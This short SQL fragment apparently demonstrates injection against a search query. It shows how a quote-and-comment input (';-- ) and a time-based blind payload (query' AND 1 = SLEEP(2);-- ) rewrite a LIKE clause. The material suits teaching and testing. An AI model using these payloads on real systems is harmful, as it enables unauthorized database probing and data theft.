-- Expected SQL Search Query
SELECT ? FROM ? WHERE ? LIKE ? '%query%';

-- Step 1 / QUERY: ';-- 
SELECT ? FROM ? WHERE ? LIKE ? '%';-- %';

-- Step 2 / QUERY: query' AND 1 = SLEEP(2);-- 
SELECT ? FROM ? WHERE ? LIKE ? '%query' AND 1 = SLEEP(2);-- %';
